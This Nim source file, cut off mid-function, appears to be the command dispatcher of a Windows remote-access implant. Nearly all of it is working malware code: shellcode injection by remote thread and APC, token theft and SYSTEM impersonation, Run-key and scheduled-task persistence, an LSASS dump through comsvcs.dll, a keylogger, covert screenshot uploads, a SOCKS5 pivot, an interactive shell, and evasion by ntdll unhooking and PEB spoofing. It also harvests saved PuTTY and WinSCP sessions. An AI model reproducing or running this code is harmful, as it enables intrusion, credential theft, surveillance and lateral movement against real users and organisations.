## Command dispatcher for Nim agent.
import winim/lean, winim/inc/tlhelp32
import std/[os, osproc, strutils, strformat, json, random, base64]
import config, transport, evasion, kerberos, pe_exec, browsercreds

var sleepSecDyn* = SleepSec
var jitterDyn*   = JitterPct

proc currentSleepMs*(): int =
  let base  = float(sleepSecDyn) * 1000.0
  let jit   = base * float(jitterDyn) / 100.0
  let delta = (rand(1.0) * 2.0 - 1.0) * jit
  return max(1000, int(base + delta))

proc runShell*(cmd: string): string =
  try:
    let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
    return output
  except: return "[error: " & getCurrentExceptionMsg() & "]"

proc getEnvCmd(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  return $buf

proc extractFilename(path: string): string =
  let s = path.replace('\\', '/')
  let i = s.rfind('/')
  if i < 0: return s
  return s[i+1..^1]

# ─────────────────────────────────────────────────────────────────────────────
# Extended capabilities: injection, tokens, registry, persistence, recon
# ─────────────────────────────────────────────────────────────────────────────

const THREAD_SET_CONTEXT_FLAG: DWORD = 0x0010

# ── Screenshot (native GDI + all-black detection) ─────────────────────────────
proc doScreenshot(): (seq[byte], bool) =
  ## Returns (bmpBytes, noDesktop). noDesktop=true when all pixels are black.
  let hDC = GetDC(0)
  if hDC == 0: return (@[], false)
  defer: discard ReleaseDC(0, hDC)
  let w = GetSystemMetrics(SM_CXSCREEN)
  let h = GetSystemMetrics(SM_CYSCREEN)
  if w <= 0 or h <= 0: return (@[], true)
  let hMem = CreateCompatibleDC(hDC)
  if hMem == 0: return (@[], false)
  defer: discard DeleteDC(hMem)
  let hBmp = CreateCompatibleBitmap(hDC, w, h)
  if hBmp == 0: return (@[], false)
  defer: discard DeleteObject(hBmp)
  let hOld = SelectObject(hMem, hBmp)
  defer: discard SelectObject(hMem, hOld)
  discard BitBlt(hMem, 0, 0, w, h, hDC, 0, 0, SRCCOPY)
  var bi: BITMAPINFOHEADER
  bi.biSize = DWORD(sizeof(bi))
  bi.biWidth = w; bi.biHeight = -h
  bi.biPlanes = 1; bi.biBitCount = 32
  bi.biCompression = BI_RGB
  let dataSz = w * h * 4
  var pixels = newSeq[uint8](dataSz)
  if GetDIBits(hMem, hBmp, 0, UINT(h), addr pixels[0],
               cast[ptr BITMAPINFO](addr bi), DIB_RGB_COLORS) == 0:
    return (@[], false)
  var allBlack = true
  for px in pixels:
    if px != 0: allBlack = false; break
  if allBlack: return (@[], true)
  # Build BMP file
  let rowBytes = ((w * 32 + 31) div 32) * 4
  let fileSize = 54 + rowBytes * h
  var bmpFile = newSeq[byte](fileSize)
  template w32(off: int, v: uint32) =
    bmpFile[off]   = uint8(v and 0xFF)
    bmpFile[off+1] = uint8((v shr 8) and 0xFF)
    bmpFile[off+2] = uint8((v shr 16) and 0xFF)
    bmpFile[off+3] = uint8((v shr 24) and 0xFF)
  template w16(off: int, v: uint16) =
    bmpFile[off]   = uint8(v and 0xFF)
    bmpFile[off+1] = uint8((v shr 8) and 0xFF)
  bmpFile[0] = 0x42; bmpFile[1] = 0x4D
  w32(2,  uint32(fileSize))
  w32(10, 54u32)
  w32(14, 40u32)
  w32(18, uint32(w)); w32(22, uint32(h))
  w16(26, 1u16); w16(28, 32u16)
  w32(30, BI_RGB)
  w32(34, uint32(rowBytes * h))
  # BGRA → BMP (flip rows for positive height BMP convention)
  for row in 0 ..< h:
    let srcRow = (h - 1 - row) * w * 4
    let dstRow = 54 + row * rowBytes
    for col in 0 ..< w:
      let s = srcRow + col * 4
      let d = dstRow + col * 4
      bmpFile[d]   = pixels[s+2]   # B
      bmpFile[d+1] = pixels[s+1]   # G
      bmpFile[d+2] = pixels[s]     # R
      bmpFile[d+3] = pixels[s+3]   # A
  return (bmpFile, false)

# ── Screenwatch globals ────────────────────────────────────────────────────────
var gSwStop     {.volatile.}: bool = true
var gSwInterval: int               = 10
var gSwTaskId:   int64             = 0
var gSwLastTick: DWORD             = 0
var gSwFrame:    int               = 0

proc screenwatchTick*(t: var AgentTransport) =
  if gSwStop: return
  let now = GetTickCount()
  if int(now - gSwLastTick) < gSwInterval * 1000: return
  gSwLastTick = now
  let (data, noDesktop) = doScreenshot()
  if noDesktop:
    t.sendResult(gSwTaskId, "", "screenshot: no_interactive_desktop")
  elif data.len > 0:
    let nm = "watch_" & $gSwFrame & ".bmp"
    inc gSwFrame
    t.uploadFile(gSwTaskId, nm, data)
    t.sendResult(gSwTaskId, "[+] screenwatch frame captured", "")

# ── Remote thread injection ───────────────────────────────────────────────────
proc doInjectRemote(pid: int; sc: seq[byte]): string =
  let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
  var written: SIZE_T
  discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
  var old: DWORD
  discard VirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
  var tid: DWORD
  let ht = CreateRemoteThread(hProc, nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, addr tid)
  if ht == 0: return "CreateRemoteThread failed (err " & $GetLastError() & ")"
  discard CloseHandle(ht)
  return "[+] injected " & $sc.len & " bytes into PID " & $pid & " (TID=" & $tid & ")"

# ── APC queue injection ───────────────────────────────────────────────────────
proc doInjectAPC(pid: int; sc: seq[byte]): string =
  let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
  var written: SIZE_T
  discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
  if snap == INVALID_HANDLE_VALUE: return "snapshot failed"
  defer: discard CloseHandle(snap)
  var te: THREADENTRY32
  te.dwSize = DWORD(sizeof(te))
  var queued = 0
  if Thread32First(snap, addr te).bool:
    while true:
      if te.th32OwnerProcessID == DWORD(pid):
        let ht = OpenThread(THREAD_SET_CONTEXT_FLAG, WINBOOL(0), te.th32ThreadID)
        if ht != 0:
          discard QueueUserAPC(cast[PAPCFUNC](mem), ht, 0)
          discard CloseHandle(ht)
          inc queued
      if not Thread32Next(snap, addr te).bool: break
  return "[+] APC queued to " & $queued & " thread(s) in PID " & $pid

# ── Privilege helper ──────────────────────────────────────────────────────────
proc enablePriv(hToken: HANDLE; privName: string): bool =
  var luid: LUID
  if LookupPrivilegeValueW(nil, newWideCString(privName), addr luid) == 0: return false
  var tp: TOKEN_PRIVILEGES
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  return AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(tp)), nil, nil).bool

# ── Token steal ───────────────────────────────────────────────────────────────
proc doTokenSteal(pid: int): string =
  var hSelf: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
    discard enablePriv(hSelf, "SeDebugPrivilege")
    discard CloseHandle(hSelf)
  let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, DWORD(pid))
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  var hTok: HANDLE
  if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
    return "OpenProcessToken failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hTok)
  var hDup: HANDLE
  discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
    securityImpersonation, tokenImpersonation, addr hDup)
  if hDup == 0: return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
  if ImpersonateLoggedOnUser(hDup) == 0:
    discard CloseHandle(hDup)
    return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
  discard CloseHandle(hDup)
  return "[+] impersonating token from PID " & $pid

# ── Logon-based token ─────────────────────────────────────────────────────────
proc doTokenMake(user, domain, pass: string): string =
  var hTok: HANDLE
  if LogonUserW(newWideCString(user), newWideCString(domain), newWideCString(pass),
      LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, addr hTok) == 0:
    return "LogonUser failed (err " & $GetLastError() & ")"
  if ImpersonateLoggedOnUser(hTok) == 0:
    discard CloseHandle(hTok)
    return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
  discard CloseHandle(hTok)
  return "[+] impersonating " & domain & "\\" & user

# ── Token drop / whoami ───────────────────────────────────────────────────────
proc doTokenDrop(): string =
  discard RevertToSelf()
  return "[+] reverted to original token"

proc doTokenWhoami(): string =
  var buf: array[512, WCHAR]
  var sz = DWORD(buf.len)
  if GetUserNameW(addr buf[0], addr sz) == 0: return "GetUserNameW failed"
  return $cast[WideCString](addr buf[0])

# ── SYSTEM elevation via winlogon token ──────────────────────────────────────
proc doGetSystem(): string =
  var hSelf: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
    discard enablePriv(hSelf, "SeDebugPrivilege")
    discard CloseHandle(hSelf)
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return "CreateToolhelp32Snapshot failed"
  defer: discard CloseHandle(snap)
  var pe: PROCESSENTRY32W
  pe.dwSize = DWORD(sizeof(pe))
  var sysPid: DWORD = 0
  if Process32FirstW(snap, addr pe).bool:
    while true:
      if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "winlogon.exe":
        sysPid = pe.th32ProcessID; break
      if not Process32NextW(snap, addr pe).bool: break
  if sysPid == 0: return "winlogon.exe not found"
  let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
  if hProc == 0: return "OpenProcess(winlogon) failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  var hTok: HANDLE
  if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0:
    return "OpenProcessToken(winlogon) failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hTok)
  var hDup: HANDLE
  discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
    securityImpersonation, tokenImpersonation, addr hDup)
  if hDup == 0: return "DuplicateTokenEx failed"
  if ImpersonateLoggedOnUser(hDup) == 0:
    discard CloseHandle(hDup)
    return "ImpersonateLoggedOnUser failed"
  discard CloseHandle(hDup)
  return "[+] SYSTEM token impersonated (winlogon PID=" & $sysPid & ")"

# ── Persistence ───────────────────────────────────────────────────────────────
proc doPersist(name, cmd, meth: string): string =
  if meth == "schtask":
    return runShell("schtasks /create /tn \"" & name & "\" /tr \"" & cmd &
      "\" /sc ONLOGON /ru SYSTEM /f 2>&1")
  return runShell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
    name & "\" /t REG_SZ /d \"" & cmd & "\" /f 2>&1")

proc doPersistRm(name, meth: string): string =
  if meth == "schtask":
    return runShell("schtasks /delete /tn \"" & name & "\" /f 2>&1")
  return runShell("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" &
    name & "\" /f 2>&1")

# ── Port scan (PowerShell TcpClient) ─────────────────────────────────────────
proc doPortScan(host, ports: string; timeoutMs: int): string =
  let ps = "$h='" & host & "';$t=" & $timeoutMs & ";" &
    "'" & ports & "'.Split(',') | ForEach-Object { $p=[int]$_;" &
    "$s=New-Object System.Net.Sockets.TcpClient;" &
    "$a=$s.BeginConnect($h,$p,$null,$null);" &
    "if($a.AsyncWaitHandle.WaitOne($t)){if($s.Connected){'OPEN '+$h+':'+$p};$s.Close()} }"
  let (outp, _) = execCmdEx("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
  return if outp.strip() == "": "no open ports" else: outp

# ── LSASS minidump via comsvcs.dll ────────────────────────────────────────────
proc doMinidump(outPath: string): string =
  let ps = "$p=(Get-Process lsass).Id;" &
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '" & outPath & "' full"
  let res = runShell("powershell.exe -NoP -NonI -C \"" & ps & "\"")
  return if res.strip() == "": "[+] dump written to " & outPath else: res

# ─────────────────────────────────────────────────────────────────────────────

# ── Token Store ───────────────────────────────────────────────────────────────
type TokenEntry = object
  id: int
  pid: DWORD
  user: string
  token: HANDLE
var gTokenStore: seq[TokenEntry]

proc doTokenStoreSteal(pid: DWORD): string =
  var hSelf: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
    discard enablePriv(hSelf, "SeDebugPrivilege")
    discard CloseHandle(hSelf)
  let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid)
  if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hProc)
  var hTok: HANDLE
  if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
    return "OpenProcessToken failed (err " & $GetLastError() & ")"
  defer: discard CloseHandle(hTok)
  var hDup: HANDLE
  if DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil, securityImpersonation, tokenImpersonation, addr hDup) == 0:
    return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
  var needed: DWORD = 0
  discard GetTokenInformation(hDup, cast[TOKEN_INFORMATION_CLASS](1), nil, 0, addr needed)
  var tbuf = newSeq[byte](int(needed))
  var userName = "unknown"
  if needed > 0 and GetTokenInformation(hDup, cast[TOKEN_INFORMATION_CLASS](1),
      cast[LPVOID](addr tbuf[0]), needed, addr needed) != 0:
    let tu = cast[ptr TOKEN_USER](addr tbuf[0])
    var nameBuf: array[256, WCHAR]
    var domBuf: array[256, WCHAR]
    var nameLen = DWORD(256); var domLen = DWORD(256); var sidType: SID_NAME_USE
    if LookupAccountSidW(nil, tu.User.Sid, addr nameBuf[0], addr nameLen,
        addr domBuf[0], addr domLen, addr sidType) != 0:
      userName = $cast[WideCString](addr domBuf[0]) & "\\" & $cast[WideCString](addr nameBuf[0])
  let newId = gTokenStore.len + 1
  gTokenStore.add(TokenEntry(id: newId, pid: pid, user: userName, token: hDup))
  return "[+] stored token id=" & $newId & " pid=" & $pid & " user=" & userName

# ── Interactive Shell ──────────────────────────────────────────────────────────
var gIshellProc: HANDLE = 0
var gIshellStdinW: HANDLE = 0
var gIshellStdoutR: HANDLE = 0

proc doIshellOpen(shell: string): string =
  if gIshellProc != 0: return "[-] interactive shell already open"
  var sa: SECURITY_ATTRIBUTES
  sa.nLength = DWORD(sizeof(sa))
  sa.bInheritHandle = WINBOOL(1)
  var stdinR, stdinW, stdoutR, stdoutW: HANDLE
  if CreatePipe(addr stdinR, addr stdinW, addr sa, 0) == 0:
    return "CreatePipe(stdin) failed"
  if CreatePipe(addr stdoutR, addr stdoutW, addr sa, 0) == 0:
    discard CloseHandle(stdinR); discard CloseHandle(stdinW)
    return "CreatePipe(stdout) failed"
  discard SetHandleInformation(stdinW, HANDLE_FLAG_INHERIT, 0)
  discard SetHandleInformation(stdoutR, HANDLE_FLAG_INHERIT, 0)
  var si: STARTUPINFOW
  si.cb = DWORD(sizeof(si))
  si.dwFlags = DWORD(STARTF_USESTDHANDLES)
  si.hStdInput = stdinR; si.hStdOutput = stdoutW; si.hStdError = stdoutW
  var pi: PROCESS_INFORMATION
  let shellExe = if shell == "ps": "powershell.exe" else: "cmd.exe"
  var cmdW = newWideCString(shellExe)
  if CreateProcessW(nil, cmdW, nil, nil, WINBOOL(1), 0, nil, nil, addr si, addr pi) == 0:
    discard CloseHandle(stdinR); discard CloseHandle(stdinW)
    discard CloseHandle(stdoutR); discard CloseHandle(stdoutW)
    return "CreateProcess failed (err " & $GetLastError() & ")"
  discard CloseHandle(pi.hThread)
  discard CloseHandle(stdinR)
  discard CloseHandle(stdoutW)
  gIshellProc = pi.hProcess; gIshellStdinW = stdinW; gIshellStdoutR = stdoutR
  return "[+] shell opened (" & shellExe & ")"

proc doIshellRun(cmd: string): string =
  if gIshellProc == 0: return "[-] no shell open"
  let line = cmd & "\r\n"
  var written: DWORD = 0
  discard WriteFile(gIshellStdinW, cast[LPCVOID](unsafeAddr line[0]),
    DWORD(line.len), addr written, nil)
  var output = ""
  var waited = 0
  while waited < 2000:
    var avail: DWORD = 0
    if PeekNamedPipe(gIshellStdoutR, nil, 0, nil, addr avail, nil) != 0 and avail > 0:
      var rbuf = newString(int(avail))
      var rdBytes: DWORD = 0
      if ReadFile(gIshellStdoutR, cast[LPVOID](addr rbuf[0]), avail, addr rdBytes, nil) != 0:
        output.add(rbuf[0..<int(rdBytes)])
    else:
      Sleep(DWORD(50)); waited += 50
  return if output == "": "[no output]" else: output

proc doIshellClose(): string =
  if gIshellProc == 0: return "[-] no shell open"
  if gIshellStdinW != 0: discard CloseHandle(gIshellStdinW); gIshellStdinW = 0
  if WaitForSingleObject(gIshellProc, DWORD(2000)) == DWORD(WAIT_TIMEOUT):
    discard TerminateProcess(gIshellProc, 0)
  discard CloseHandle(gIshellProc); gIshellProc = 0
  if gIshellStdoutR != 0: discard CloseHandle(gIshellStdoutR); gIshellStdoutR = 0
  return "[+] shell closed"

# ── Keylogger ──────────────────────────────────────────────────────────────────
var gKeylogStop {.volatile.}: bool = true
var gKeylogBuf: string = ""
var gKeylogHook: HHOOK = 0
var gKeylogThread: HANDLE = 0

proc keylogHookCb(nCode: int32; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode >= 0 and wParam == WPARAM(WM_KEYDOWN):
    let khs = cast[ptr KBDLLHOOKSTRUCT](lParam)
    var state: array[256, BYTE]
    discard GetKeyboardState(addr state[0])
    var wbuf: array[4, WCHAR]
    let n = ToUnicode(khs.vkCode, khs.scanCode, addr state[0],
        addr wbuf[0], int32(4), UINT(0))
    if n > 0:
      for chi in 0..<int(n):
        let wi = int(wbuf[chi])
        if wi >= 32 and wi < 127: gKeylogBuf.add(char(wi))
        elif wi == 13: gKeylogBuf.add('\n')
  return CallNextHookEx(0, nCode, wParam, lParam)

proc keylogThreadProc(p: LPVOID): DWORD {.stdcall.} =
  gKeylogHook = SetWindowsHookExW(int32(WH_KEYBOARD_LL), keylogHookCb, 0, 0)
  var msg: MSG
  while not gKeylogStop:
    while PeekMessageW(addr msg, 0, 0, 0, UINT(PM_REMOVE)).bool:
      discard TranslateMessage(addr msg)
      discard DispatchMessageW(addr msg)
    Sleep(DWORD(10))
  if gKeylogHook != 0:
    discard UnhookWindowsHookEx(gKeylogHook); gKeylogHook = 0
  return 0

# ── SOCKS5 ─────────────────────────────────────────────────────────────────────
var gSocksStop {.volatile.}: bool = true
var gSocksSocket: SOCKET = INVALID_SOCKET
var gSocksThread: HANDLE = 0
type RelayParam = object
  src: SOCKET
  dst: SOCKET

proc socksRelayProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let rp = cast[ptr RelayParam](p)
  let src = rp.src; let dst = rp.dst
  dealloc(p)
  var buf: array[4096, char]
  while true:
    let n = recv(src, addr buf[0], int32(4096), 0)
    if n <= 0: break
    var sent = 0
    while sent < int(n):
      let s = send(dst, addr buf[sent], int32(int(n) - sent), 0)
      if s <= 0: sent = int(n); break
      sent += int(s)
  discard shutdown(dst, int32(SD_BOTH))
  return 0

proc socksClientProc(p: LPVOID): DWORD {.stdcall.} =
  let clientSock = cast[SOCKET](cast[int](p))
  var buf: array[256, byte]
  var n = recv(clientSock, cast[ptr char](addr buf[0]), int32(256), 0)
  if n < 3 or int(buf[0]) != 5:
    discard closesocket(clientSock); return 1
  var authReply: array[2, byte] = [0x05'u8, 0x00'u8]
  discard send(clientSock, cast[ptr char](addr authReply[0]), int32(2), 0)
  n = recv(clientSock, cast[ptr char](addr buf[0]), int32(256), 0)
  if n < 7 or int(buf[1]) != 1:
    discard closesocket(clientSock); return 1
  var targetHost = ""
  var targetPort: uint16 = 0
  case int(buf[3])
  of 1:
    if n < 10: discard closesocket(clientSock); return 1
    targetHost = $int(buf[4]) & "." & $int(buf[5]) & "." & $int(buf[6]) & "." & $int(buf[7])
    targetPort = (uint16(buf[8]) shl 8) or uint16(buf[9])
  of 3:
    let dlen = int(buf[4])
    if n < 5 + dlen + 2: discard closesocket(clientSock); return 1
    for di in 0..<dlen: targetHost.add(char(buf[5+di]))
    targetPort = (uint16(buf[5+dlen]) shl 8) or uint16(buf[6+dlen])
  else:
    discard closesocket(clientSock); return 1
  let targetSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if targetSock == INVALID_SOCKET:
    discard closesocket(clientSock); return 1
  var csa: sockaddr_in
  csa.sin_family = int16(AF_INET); csa.sin_port = htons(targetPort)
  var hostCS = targetHost & "\x00"
  let ipAddr = inet_addr(addr hostCS[0])
  if ipAddr == INADDR_NONE:
    let he = gethostbyname(addr hostCS[0])
    if he == nil or he.h_addr_list == nil or he.h_addr_list[] == nil:
      discard closesocket(targetSock); discard closesocket(clientSock); return 1
    csa.sin_addr.S_addr = cast[ptr int32](he.h_addr_list[])[]
  else:
    csa.sin_addr.S_addr = ipAddr
  if connect(targetSock, cast[ptr sockaddr](addr csa), int32(sizeof(csa))) != 0:
    discard closesocket(targetSock); discard closesocket(clientSock); return 1
  var reply: array[10, byte] = [0x05'u8,0x00'u8,0x00'u8,0x01'u8,0'u8,0'u8,0'u8,0'u8,0'u8,0'u8]
  discard send(clientSock, cast[ptr char](addr reply[0]), int32(10), 0)
  let rp1 = cast[ptr RelayParam](alloc0(sizeof(RelayParam)))
  rp1.src = clientSock; rp1.dst = targetSock
  let rp2 = cast[ptr RelayParam](alloc0(sizeof(RelayParam)))
  rp2.src = targetSock; rp2.dst = clientSock
  var rtid: DWORD = 0
  let t1 = CreateThread(nil, 0, socksRelayProc, cast[LPVOID](rp1), 0, addr rtid)
  let t2 = CreateThread(nil, 0, socksRelayProc, cast[LPVOID](rp2), 0, addr rtid)
  if t1 != 0 and t2 != 0:
    var ths: array[2, HANDLE] = [t1, t2]
    discard WaitForMultipleObjects(int32(2), addr ths[0], int32(1), DWORD(INFINITE))
  if t1 != 0: discard CloseHandle(t1)
  if t2 != 0: discard CloseHandle(t2)
  discard closesocket(clientSock); discard closesocket(targetSock)
  return 0

proc socksServerProc(p: LPVOID): DWORD {.stdcall.} =
  var wsaData: WSADATA
  discard WSAStartup(WORD(0x0202), addr wsaData)
  let port = cast[int](p)
  let listenSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if listenSock == INVALID_SOCKET: return 1
  gSocksSocket = listenSock
  var lsa: sockaddr_in
  lsa.sin_family = int16(AF_INET); lsa.sin_port = htons(uint16(port)); lsa.sin_addr.S_addr = int32(0)
  var reuseOpt: int32 = 1
  discard setsockopt(listenSock, int32(SOL_SOCKET), int32(SO_REUSEADDR),
    cast[ptr char](addr reuseOpt), int32(sizeof(reuseOpt)))
  if `bind`(listenSock, cast[ptr sockaddr](addr lsa), int32(sizeof(lsa))) != 0:
    discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 1
  if listen(listenSock, int32(5)) != 0:
    discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 1
  while not gSocksStop:
    var cAddr: sockaddr_in; var cLen: int32 = int32(sizeof(cAddr))
    let cSock = accept(listenSock, cast[ptr sockaddr](addr cAddr), addr cLen)
    if cSock == INVALID_SOCKET: break
    var stid: DWORD = 0
    discard CloseHandle(CreateThread(nil, 0, socksClientProc,
      cast[LPVOID](cast[int](cSock)), 0, addr stid))
  discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET
  return 0

# ── Other helpers ──────────────────────────────────────────────────────────────
proc doBlockDlls(): string =
  var policy: DWORD = 1
  if SetProcessMitigationPolicy(int32(8), cast[PVOID](addr policy), SIZE_T(sizeof(policy))) == 0:
    return "SetProcessMitigationPolicy failed (err " & $GetLastError() & ")"
  return "[+] BLOCKDLLS enabled"

proc doPebSpoof(newPath: string): string =
  if newPath.len == 0: return "empty path"
  var pbi: PROCESS_BASIC_INFORMATION
  var retLen: ULONG = 0
  if NtQueryInformationProcess(GetCurrentProcess(), processBasicInformation,
      cast[PVOID](addr pbi), ULONG(sizeof(pbi)), addr retLen) != 0:
    return "NtQueryInformationProcess failed"
  let peb = pbi.PebBaseAddress
  if peb == nil: return "PEB is nil"
  let pp = peb.ProcessParameters
  if pp == nil: return "ProcessParameters is nil"
  var wchars = newSeq[WCHAR](newPath.len + 1)
  for ci in 0..<newPath.len: wchars[ci] = WCHAR(ord(newPath[ci]))
  wchars[newPath.len] = WCHAR(0)
  let newBytes = newPath.len * 2
  var old: DWORD = 0
  for si in 0..1:
    let us: ptr UNICODE_STRING = if si == 0: addr pp.ImagePathName else: addr pp.CommandLine
    if us.Buffer == nil: continue
    if int(us.MaximumLength) < newBytes + 2: continue
    discard VirtualProtect(cast[LPVOID](us.Buffer), SIZE_T(newBytes + 2), PAGE_READWRITE, addr old)
    copyMem(cast[pointer](us.Buffer), cast[pointer](addr wchars[0]), newBytes + 2)
    discard VirtualProtect(cast[LPVOID](us.Buffer), SIZE_T(newBytes + 2), old, addr old)
    us.Length = USHORT(newBytes)
  return "[+] PEB spoofed to " & newPath

proc doNtdllUnhook(): string =
  let freshBase = LoadLibraryExW(newWideCString("ntdll.dll"), 0, DWORD(DONT_RESOLVE_DLL_REFERENCES))
  if freshBase == 0: return "LoadLibraryEx(ntdll) failed"
  defer: discard FreeLibrary(freshBase)
  let liveBase = GetModuleHandleW(newWideCString("ntdll.dll"))
  if liveBase == 0: return "GetModuleHandle(ntdll) failed"
  let dosHdr = cast[ptr IMAGE_DOS_HEADER](liveBase)
  let ntHdr = cast[PIMAGE_NT_HEADERS](cast[int](liveBase) + dosHdr.e_lfanew)
  let expRVA = ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
  if expRVA == 0: return "no export directory"
  let expDir = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[int](liveBase) + int(expRVA))
  let namesArr = cast[ptr UncheckedArray[DWORD]](cast[int](liveBase) + int(expDir.AddressOfNames))
  let ordsArr  = cast[ptr UncheckedArray[WORD]](cast[int](liveBase) + int(expDir.AddressOfNameOrdinals))
  let funcsArr = cast[ptr UncheckedArray[DWORD]](cast[int](liveBase) + int(expDir.AddressOfFunctions))
  var count = 0
  for ni in 0..<int(expDir.NumberOfNames):
    let fname = $cast[cstring](cast[int](liveBase) + int(namesArr[ni]))
    if fname.len < 2 or fname[0] != 'N' or fname[1] != 't': continue
    let funcRVA = int(funcsArr[int(ordsArr[ni])])
    let liveFunc  = cast[ptr byte](cast[int](liveBase)  + funcRVA)
    let freshFunc = cast[ptr byte](cast[int](freshBase) + funcRVA)
    if liveFunc[] == 0xE9'u8:
      var old2: DWORD = 0
      if VirtualProtect(cast[LPVOID](liveFunc), SIZE_T(8), PAGE_EXECUTE_READWRITE, addr old2) != 0:
        copyMem(liveFunc, freshFunc, 8)
        discard VirtualProtect(cast[LPVOID](liveFunc), SIZE_T(8), old2, addr old2)
        inc count
  return "[+] unhooked " & $count & " Nt* functions"

proc doSessionGopher(): string =
  var output = ""
  block putty:
    var hKey: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
        newWideCString("Software\\SimonTatham\\PuTTY\\Sessions"),
        0, KEY_READ, addr hKey) != 0: break putty
    var idx: DWORD = 0
    while true:
      var nameBuf: array[256, WCHAR]; var nameLen: DWORD = 256
      if RegEnumKeyExW(hKey, idx, addr nameBuf[0], addr nameLen, nil, nil, nil, nil) != 0: break
      let sname = $cast[WideCString](addr nameBuf[0])
      var hSess: HKEY
      if RegOpenKeyExW(hKey, newWideCString(sname), 0, KEY_READ, addr hSess) == 0:
        var vbuf: array[512, WCHAR]; var vlen: DWORD = 0; var rtype: DWORD = 0
        var host, user, port = ""
        vlen = DWORD(sizeof(vbuf))
        if RegQueryValueExW(hSess, newWideCString("HostName"), nil, addr rtype,
            cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
          host = $cast[WideCString](addr vbuf[0])
        var portVal: DWORD = 22; vlen = DWORD(sizeof(portVal))
        if RegQueryValueExW(hSess, newWideCString("PortNumber"), nil, addr rtype,
            cast[LPBYTE](addr portVal), addr vlen) == 0: port = $portVal
        else: port = "22"
        vlen = DWORD(sizeof(vbuf))
        if RegQueryValueExW(hSess, newWideCString("UserName"), nil, addr rtype,
            cast[LPBYTE](addr vbuf[0]), addr vlen) == 0:
          user = $cast[WideCString](addr vbuf[0])
        output.add("[PuTTY] " & sname & " host=" & host & " port=" & port & " user=" & user & "\n")
        discard RegCloseKey(hSess)
      idx = idx + DWORD(1)
    discard RegCloseKey(hKey)
  block winscp:
    var hKey: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
        newWideCString("Software\\Martin Prikryl\\WinSCP 2\\Sessions"),
        0, KEY_READ, addr hKey) != 0: break winscp
    var idx: DWORD = 0
    while true:
